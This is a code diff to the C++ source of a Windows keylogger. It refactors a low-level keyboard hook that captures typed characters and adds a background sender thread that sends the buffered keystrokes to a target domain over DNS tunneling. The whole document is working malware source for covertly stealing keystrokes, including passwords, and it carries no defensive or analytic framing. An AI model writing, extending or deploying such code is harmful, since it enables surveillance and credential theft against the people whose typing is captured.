@@ -1,35 +1,96 @@
-#include "Network.h"
 #include "KeyLogger.h"
-#include <iostream>
+#include "Network.h"
 
-// them cac ham xu li keylogger vao day
-
+/**
+ * Keyboard hook callback function
+ * Captures keystrokes and adds to queue for async sending
+ * 
+ * CRITICAL: This function must be FAST (< 1ms)
+ * - NO console output (std::cout)
+ * - NO network calls (sendData)
+ * - Only capture keystrokes and add to buffer
+ */
 LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
-	if (nCode >= 0) {  // do not process key if < 0, as specified by documentation
-		PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);  
-		if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
-			GetKeyState(VK_SHIFT);  // needed to update keyboard state
-			BYTE keyboardState[256];
-			GetKeyboardState(keyboardState);
+	if (nCode < 0 || nCode != HC_ACTION) {
+		return CallNextHookEx(nullptr, nCode, wParam, lParam);
+	}
+
+	if (wParam == WM_KEYDOWN) {
+		PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
+		
+		// Update keyboard state
+		GetKeyState(VK_SHIFT);
+		BYTE keyboardState[256];
+		if (!GetKeyboardState(keyboardState)) {
+			return CallNextHookEx(nullptr, nCode, wParam, lParam);
+		}
+		
+		unsigned short translatedChar[2] = {0};
+		
+		// Convert virtual key code to ASCII
+		int result = ToAsciiEx(key->vkCode, key->scanCode, keyboardState, 
+		                       translatedChar, key->flags, keyboardLayout);
+		
+		if (result == 1) {
+			char keyChar = static_cast<char>(translatedChar[0]);
 			
-			unsigned short translatedChar[2];
+			// Only add printable ASCII characters (32-126)
+			if (keyChar >= 32 && keyChar <= 126) {
+				keystrokeBuffer += keyChar;
+			}
 			
-			if (ToAsciiEx(key->vkCode, key->scanCode, keyboardState, translatedChar, key->flags, keyboardLayout) == 1) {  // if only one key in buffer
-				char key1 = static_cast<char>(translatedChar[0]);
-				keystrokeBuffer += key1;
-				if (keystrokeBuffer.size() >= MAX_BUFFER) {
-					std::cout << keystrokeBuffer << std::endl;
-					int success = sendData(connectionId, packetNumber, TARGET.c_str(), keystrokeBuffer.c_str());
-					keystrokeBuffer = "";
-					std::cout << success << std::endl << std::endl;
-					packetNumber++;
-					if (packetNumber > 999) {
-						packetNumber = 0;
-					}
+			// When buffer is full, add to queue for async sending
+			if (keystrokeBuffer.size() >= MAX_BUFFER) {
+				// Thread-safe queue push
+				{
+					std::lock_guard<std::mutex> lock(queueMutex);
+					sendQueue.push(keystrokeBuffer);
 				}
+				
+				keystrokeBuffer.clear();  // Clear buffer immediately
 			}
 		}
 	}
 	
-	return CallNextHookEx(nullptr, nCode, wParam, lParam); // pass the keypress event to the next hook in the system chain hook
+	return CallNextHookEx(nullptr, nCode, wParam, lParam);
+}
+
+/**
+ * Sender thread - runs independently from hook
+ * Processes queue and sends data via DNS tunneling
+ * This keeps the hook fast and responsive
+ */
+DWORD WINAPI senderThread(LPVOID lpParam) {
+	while (!shouldStopSender) {
+		std::string dataToSend;
+		
+		// Check queue
+		{
+			std::lock_guard<std::mutex> lock(queueMutex);
+			if (!sendQueue.empty()) {
+				dataToSend = sendQueue.front();
+				sendQueue.pop();
+			}
+		}
+		
+		// Send data if available
+		if (!dataToSend.empty()) {
+			int success = sendData(connectionId, packetNumber, 
+			                       TARGET_DOMAIN.c_str(), dataToSend.c_str());
+			
+			if (success == 0) {
+				packetNumber++;
+				
+				// Reset packet number after 999
+				if (packetNumber > 999) {
+					packetNumber = 0;
+				}
+			}
+		} else {
+			// No data, sleep to avoid busy-waiting
+			Sleep(100);
+		}
+	}
+	
+	return 0;
 }
